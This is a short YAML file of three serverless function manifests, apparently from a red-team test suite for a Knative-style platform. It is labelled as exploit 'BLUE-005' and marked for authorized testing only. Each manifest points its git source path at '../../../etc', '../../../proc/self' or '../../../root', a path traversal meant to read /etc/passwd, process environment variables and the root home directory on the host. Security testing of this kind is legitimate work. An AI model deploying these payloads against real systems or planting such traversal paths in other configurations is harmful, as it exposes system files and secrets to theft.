# BLUE-005: Path Traversal - Read System Files
# ⚠️ AUTHORIZED TESTING ONLY
#
# This exploit reads various system files using path traversal.
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: blue-005-read-etc-passwd
  labels:
    redteam: "true"
    exploit: "blue-005"
    target: "etc-passwd"
  annotations:
    redteam.knative.io/description: "Path traversal to read /etc/passwd"
spec:
  source:
    type: git
    git:
      url: "https://github.com/knative/docs"
      ref: "main"
      path: "../../../etc"
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: blue-005-read-proc
  labels:
    redteam: "true"
    exploit: "blue-005"
    target: "proc"
  annotations:
    redteam.knative.io/description: "Path traversal to read /proc/self/environ"
spec:
  source:
    type: git
    git:
      url: "https://github.com/knative/docs"
      ref: "main"
      # Read environment variables from /proc
      path: "../../../proc/self"
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: blue-005-read-root
  labels:
    redteam: "true"
    exploit: "blue-005"
    target: "root-home"
  annotations:
    redteam.knative.io/description: "Path traversal to read root home"
spec:
  source:
    type: git
    git:
      url: "https://github.com/knative/docs"
      ref: "main"
      path: "../../../root"
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
